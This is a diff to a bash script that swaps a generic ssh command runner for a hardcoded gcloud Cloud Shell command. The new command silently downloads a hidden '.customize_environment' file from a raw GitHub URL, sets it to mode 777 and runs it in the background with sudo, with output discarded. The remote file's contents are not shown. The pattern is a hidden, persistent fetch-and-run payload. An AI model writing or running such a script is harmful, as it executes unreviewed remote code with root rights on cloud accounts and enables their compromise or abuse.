@@ -1,7 +1,7 @@
 #!/bin/bash
 
- user=$1
- ip=$2
- command=$3
+command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
 
- /usr/bin/ssh -n -T -p 6000 -i google_compute_engine -o StrictHostKeyChecking=no $user@$ip -- $command
+gcloud cloud-shell ssh --command="$command" --authorize-session --force-key-file-overwrite --quiet --account=$1
+
+echo 'command ok'
